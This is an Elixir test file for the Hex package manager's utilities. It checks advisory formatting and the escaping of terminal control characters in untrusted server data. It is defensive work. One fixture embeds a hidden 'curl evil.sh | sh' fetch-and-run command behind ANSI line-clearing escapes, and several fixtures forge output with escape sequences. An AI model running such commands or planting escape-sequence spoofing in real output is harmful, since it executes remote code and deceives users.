defmodule Hex.UtilsTest do
  use HexTest.Case

  @advisory %{
    id: "GHSA-test-0001",
    summary: "Remote code execution via crafted input",
    html_url: "https://github.com/advisories/GHSA-test-0001",
    severity: :SEVERITY_HIGH,
    api_url: "https://hex.pm/api/advisories/GHSA-test-0001"
  }

  describe "advisory_severity/1" do
    test "maps all severity atoms to strings" do
      assert Hex.Utils.advisory_severity(:SEVERITY_NONE) == "NONE"
      assert Hex.Utils.advisory_severity(:SEVERITY_LOW) == "LOW"
      assert Hex.Utils.advisory_severity(:SEVERITY_MEDIUM) == "MEDIUM"
      assert Hex.Utils.advisory_severity(:SEVERITY_HIGH) == "HIGH"
      assert Hex.Utils.advisory_severity(:SEVERITY_CRITICAL) == "CRITICAL"
    end

    test "passes unknown values through" do
      assert Hex.Utils.advisory_severity("unknown") == "unknown"
    end
  end

  describe "format_advisory_ansi/2" do
    test "includes id, severity and url" do
      assert render(@advisory) ==
               "GHSA-test-0001 (HIGH)\nRemote code execution via crafted input\nhttps://github.com/advisories/GHSA-test-0001"
    end

    test "without severity omits severity" do
      advisory = Map.delete(@advisory, :severity)

      assert render(advisory) ==
               "GHSA-test-0001\nRemote code execution via crafted input\nhttps://github.com/advisories/GHSA-test-0001"
    end

    test "without url omits url" do
      advisory = Map.delete(@advisory, :html_url)

      assert render(advisory) ==
               "GHSA-test-0001 (HIGH)\nRemote code execution via crafted input"
    end

    test "applies line prefix to wrapped lines" do
      assert render(@advisory, "    ") ==
               "GHSA-test-0001 (HIGH)\n    Remote code execution via crafted input\n    https://github.com/advisories/GHSA-test-0001"
    end

    test "emits ANSI color for severity when enabled" do
      iodata = Hex.Utils.format_advisory_ansi(@advisory)
      rendered = iodata |> IO.ANSI.format(true) |> IO.iodata_to_binary()
      assert rendered =~ "\e[31m"
      assert rendered =~ "(HIGH)"
    end

    test "renders aliases on an aka: line when present" do
      advisory =
        Map.put(@advisory, :aliases, [
          %{id: "CVE-2026-0001", url: :undefined},
          %{id: "GHSA-other-0002", url: "https://osv.dev/vulnerability/GHSA-other-0002"}
        ])

      assert render(advisory) ==
               "GHSA-test-0001 (HIGH)\naka: CVE-2026-0001, GHSA-other-0002\nRemote code execution via crafted input\nhttps://github.com/advisories/GHSA-test-0001"
    end

    test "omits aka: line when aliases are empty" do
      advisory = Map.put(@advisory, :aliases, [])

      assert render(advisory) ==
               "GHSA-test-0001 (HIGH)\nRemote code execution via crafted input\nhttps://github.com/advisories/GHSA-test-0001"
    end

    test "aka: line respects line prefix" do
      advisory = Map.put(@advisory, :aliases, [%{id: "CVE-2026-0001", url: :undefined}])

      assert render(advisory, "    ") ==
               "GHSA-test-0001 (HIGH)\n    aka: CVE-2026-0001\n    Remote code execution via crafted input\n    https://github.com/advisories/GHSA-test-0001"
    end
  end

  describe "escape_terminal/1" do
    test "keeps printable text, newlines and tabs" do
      assert Hex.Utils.escape_terminal("hello world") == "hello world"
      assert Hex.Utils.escape_terminal("café ☃") == "café ☃"
      assert Hex.Utils.escape_terminal("line1\nline2\tend") == "line1\nline2\tend"
    end

    test "escapes ANSI escapes and other control characters" do
      assert Hex.Utils.escape_terminal("\e[31mred\e[0m") == "\\e[31mred\\e[0m"
      assert Hex.Utils.escape_terminal("a\rb\bc\ad") == "a\\rb\\bc\\ad"
      assert Hex.Utils.escape_terminal(<<0x01, 0x1F>>) == "\\x01\\x1F"
      assert Hex.Utils.escape_terminal(<<0x7F>>) == "\\x7F"
    end

    test "escapes bidirectional overrides and C1 control characters" do
      assert Hex.Utils.escape_terminal("a\u{202E}b") == "a\\u{202E}b"
      assert Hex.Utils.escape_terminal("\u{2066}") == "\\u{2066}"
      assert Hex.Utils.escape_terminal(<<0x85::utf8>>) == "\\u{85}"
    end
  end

  describe "printable_ascii/1" do
    test "keeps printable ASCII" do
      assert Hex.Utils.printable_ascii("https://hex.pm/oauth/device?code=ABCD-1234") ==
               "https://hex.pm/oauth/device?code=ABCD-1234"
    end

    test "drops escape sequences, newlines and everything else outside printable ASCII" do
      assert Hex.Utils.printable_ascii("a\e[31mb\nc\td\x7Fe") == "a[31mbcde"
      assert Hex.Utils.printable_ascii("a\u{202E}b") == "ab"
      assert Hex.Utils.printable_ascii(<<0x85::utf8>>) == ""
    end
  end

  describe "untrusted server content is escaped" do
    test "format_advisory_ansi/2 escapes id, summary and aliases" do
      advisory = %{
        id: "GHSA\e[2K\rFAKE",
        summary: "Summary\e[31m and \u{202E}reversed\a",
        html_url: "https://example.com/\e[1madvisory",
        aliases: [%{id: "CVE\e[0m-1", url: :undefined}]
      }

      rendered = render(advisory)

      refute rendered =~ "\e"
      refute rendered =~ "\r"
      refute rendered =~ "\a"
      refute rendered =~ "\u{202E}"

      assert rendered =~ "GHSA\\e[2K\\rFAKE"
      assert rendered =~ "Summary\\e[31m and \\u{202E}reversed\\a"
      assert rendered =~ "aka: CVE\\e[0m-1"
      # The URL drops the bytes instead of showing them.
      assert rendered =~ "https://example.com/[1madvisory"
    end

    test "advisory_severity/1 escapes an unknown server-supplied severity" do
      assert Hex.Utils.advisory_severity("\e[31mCRITICAL") == "\\e[31mCRITICAL"
    end

    test "package_retirement_reason/1 escapes an unknown server-supplied reason" do
      assert Hex.Utils.package_retirement_reason("\e[31mother") == "\\e[31mother"
    end

    test "package_retirement_message/1 escapes the retirement message" do
      message =
        Hex.Utils.package_retirement_message(%{
          reason: :RETIRED_SECURITY,
          message: "Use 2.0\e[2K\rActually run: curl evil.sh | sh"
        })

      refute message =~ "\e"
      refute message =~ "\r"
      assert message == "(security) Use 2.0\\e[2K\\rActually run: curl evil.sh | sh"
    end

    test "package_retirement_message/1 escapes an unknown reason without a message" do
      assert Hex.Utils.package_retirement_message(%{reason: "\e[31mmystery"}) ==
               "(\\e[31mmystery)"
    end

    test "print_error_result/1 escapes a binary body" do
      Hex.Utils.print_error_result({:ok, {422, %{}, "oops\e[2K\rforged"}})
      assert_received {:mix_shell, :info, ["oops\\e[2K\\rforged"]}
    end

    test "print_error_result/1 escapes the message field" do
      Hex.Utils.print_error_result({:ok, {422, %{}, %{"message" => "bad\e[31m"}}})
      assert_received {:mix_shell, :info, ["bad\\e[31m"]}
    end

    test "print_error_result/1 escapes error keys and values" do
      body = %{"errors" => %{"name\e[1m" => "is invalid\e[2K\rforged"}}
      Hex.Utils.print_error_result({:ok, {422, %{}, body}})

      assert_received {:mix_shell, :info, [message]}
      refute message =~ "\e"
      assert message == "  name\\e[1m: is invalid\\e[2K\\rforged"
    end

    test "print_error_result/1 escapes nested error values" do
      body = %{"errors" => %{"meta" => %{"links" => "bad\e[31m"}}}
      Hex.Utils.print_error_result({:ok, {422, %{}, body}})

      assert_received {:mix_shell, :info, ["  meta:"]}
      assert_received {:mix_shell, :info, ["    links: bad\\e[31m"]}
    end
  end

  defp render(advisory, line_prefix \\ "") do
    advisory
    |> Hex.Utils.format_advisory_ansi(line_prefix)
    |> IO.ANSI.format(false)
    |> IO.iodata_to_binary()
  end

  describe "escape_terminal_json/1" do
    @tag :requires_json
    test "preserves decoded values while escaping terminal controls" do
      controls =
        [0x061C, 0x202A, 0x202B, 0x202C, 0x202D, 0x202E, 0x2066, 0x2067, 0x2068, 0x2069] ++
          Enum.to_list(0x7F..0x9F)

      for cp <- controls do
        value = <<cp::utf8>>
        data = %{value => [value, "café ☃", "\\u202E", "\e\r\n\t"]}
        json = data |> :json.encode() |> IO.iodata_to_binary() |> Hex.Utils.escape_terminal_json()
        refute json =~ value
        assert :json.decode(json) == data
      end
    end
  end
end
